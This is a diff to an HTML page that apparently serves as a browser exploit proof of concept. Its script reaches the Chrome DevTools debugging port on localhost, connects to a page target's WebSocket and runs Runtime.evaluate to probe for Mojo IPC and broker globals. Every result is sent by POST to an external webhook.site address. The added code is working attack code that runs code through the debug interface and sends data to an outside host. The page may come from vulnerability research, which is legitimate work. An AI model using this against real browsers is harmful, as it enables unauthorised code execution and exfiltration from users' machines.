@@ -2,29 +2,48 @@
 <html>
 
 <body>
-    <pre id="out">Checking DevTools...</pre>
+    <pre id="out">Connecting to DevTools...</pre>
     <script>
         (async () => {
             const out = document.getElementById("out");
             const hook = "https://webhook.site/96a9c841-170a-46a1-aca9-db43dee912a8";
 
-            async function report(message) {
-                out.textContent += "\n" + message;
+            async function report(s) {
+                out.textContent += "\n" + s;
                 try {
                     await fetch(hook, {
                         method: "POST",
                         mode: "no-cors",
-                        body: message
+                        body: s
                     });
                 } catch (_) { }
             }
 
             try {
                 const r = await fetch("http://localhost:9222/json/list");
-                const data = await r.text();
-                await report("Targets HTTP " + r.status + ": " + data);
+                const targets = await r.json();
+                const page = targets.find(t => t.type === "page" && t.webSocketDebuggerUrl);
+                if (!page) return report("No page target found");
+
+                const ws = new WebSocket(page.webSocketDebuggerUrl);
+                ws.onopen = () => {
+                    ws.send(JSON.stringify({
+                        id: 1,
+                        method: "Runtime.evaluate",
+                        params: {
+                            expression: "JSON.stringify({mojo:typeof Mojo, globals:Object.keys(window).filter(k=>/mojo|broker/i.test(k))})",
+                            returnByValue: true
+                        }
+                    }));
+                };
+                ws.onmessage = async e => {
+                    await report("CDP result: " + e.data);
+                    ws.close();
+                };
+                ws.onerror = () => report("DevTools WebSocket connection failed");
+                setTimeout(() => report("Timed out waiting for DevTools"), 5000);
             } catch (e) {
-                await report("Targets failed: " + e);
+                report("Error: " + e);
             }
         })();
     </script>
